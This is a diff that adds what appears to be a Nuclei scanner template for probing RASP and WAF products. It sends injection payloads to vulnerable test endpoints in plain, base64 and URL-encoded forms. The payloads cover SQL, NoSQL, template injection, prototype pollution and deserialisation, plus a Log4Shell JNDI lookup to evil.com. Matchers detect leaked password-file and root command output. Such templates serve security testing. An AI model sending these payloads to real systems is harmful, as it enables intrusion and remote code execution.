@@ -1,0 +1,49 @@
+id: shieldrasp-bypass
+
+info:
+  name: ShieldRASP Evasion Benchmark
+  author: SecurityTeam
+  severity: critical
+  description: Exhaustive YAML template for sweeping RASP implementations with encoding and chained evasions.
+  tags: rasp, waf, bypass, sqli, rce, xss
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vuln/sqli"
+      - "{{BaseURL}}/vuln/cmd"
+      - "{{BaseURL}}/vuln/rce"
+      - "{{BaseURL}}/api/test"
+    
+    headers:
+      Content-Type: application/json
+      X-RASP-Test: enabled
+      User-Agent: "Nuclei-Fuzzer"
+
+    payloads:
+      vectors:
+        - '{"q": "1\' OR 1=1--"}'
+        - '{"q": {"$where":"this.password.length>0"}}'
+        - '{"q": "${jndi:ldap://evil.com/a}"}'
+        - '{"q": "O:4:\"Test\":1:{s:4:\"test\";s:3:\"123\";}"}'
+        - '{"q": "{{constructor.constructor(\'alert(1)\')()}}"}'
+        - '{"__proto__":{"admin":true}}'
+    
+    fuzzing:
+      - part: body
+        type: replace
+        fuzz:
+          - "{{vectors}}"
+          - "{{base64(vectors)}}"
+          - "{{urlencode(vectors)}}"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:x:0:0"
+          - "uid=0(root)"
+          - "Windows IP Configuration"
